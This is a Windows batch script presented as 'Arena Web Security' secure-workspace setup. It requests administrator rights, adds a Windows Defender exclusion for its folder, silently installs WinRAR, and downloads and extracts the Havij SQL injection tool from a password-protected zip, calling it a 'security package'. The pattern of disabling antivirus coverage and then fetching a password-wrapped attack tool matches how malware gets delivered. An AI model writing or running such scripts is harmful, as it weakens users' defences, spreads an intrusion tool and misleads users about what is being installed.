@echo off
Title Arena Web Security
setlocal enabledelayedexpansion

:: Configuration
set "bat_dir=%~dp0"
set "folder=%bat_dir%Arena-Isolated"
set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe"
set "winrar_installer=!folder!\WinRAR-free.exe"
set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
set "havij_zip=!folder!\Havij_1.12_Free.zip"
set "password=darknet123"

:: Header
echo =============================================
echo Secure Environment Setup - Arena Web Security
echo =============================================
echo.

:: Check admin rights (ONLY CHANGE MADE)
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [STEP] Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"\"%~dpnx0\"\"' -Verb RunAs"
    exit /b
)

:: User confirmation
choice /c yn /n /m "This will create secure workspace and download Havij. Continue? (Y/N)"
if %errorlevel% equ 2 (
    exit /b
)

:: Create Arena-Isolated
if not exist "!folder!\" (
    mkdir "!folder!"
    echo [SUCCESS] Created secure workspace: !folder!
) else (
    echo [INFO] Secure workspace already exists: !folder!
)

:: Add Defender exclusion
echo [STEP] Configuring security exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '!folder!'" && (
    echo [SUCCESS] Security zone established
) || (
    echo [ERROR] Failed to create security zone
    pause
    exit /b
)

:: Install WinRAR
echo [STEP] Downloading latest WinRAR...
powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'"

echo [STEP] Installing/Updating WinRAR...
"!winrar_installer!" /S
timeout /t 5 /nobreak >nul
del "!winrar_installer!" >nul

:: Get WinRAR path from registry
set "winrar_exe="
for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do set "winrar_exe=%%B"
if not defined winrar_exe set "winrar_exe=C:\Program Files\WinRAR\WinRAR.exe"

:: Download Havij ZIP
echo [STEP] Retrieving security package...
powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" && (
    echo [SUCCESS] Package acquired
) || (
    echo [ERROR] Package retrieval failed
    pause
    exit /b
)

:: Modified extraction section
echo [STEP] Decrypting secure package...
start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\"

if %errorlevel% equ 0 (
    echo [SUCCESS] Package decrypted successfully
) else if %errorlevel% equ 1 (
    echo [ALERT] Invalid security credentials
) else if %errorlevel% equ 2 (
    echo [ERROR] Encrypted package missing
) else (
    echo [ERROR] Decryption failure (Code: %errorlevel%)
)

:: Final output
echo.
echo ==============================================
echo [READY] Security environment preparation complete
echo        Access your workspace at:
echo        %folder%
echo ==============================================
echo.

:: Open folder AFTER extraction completes
start explorer "!folder!"
pause
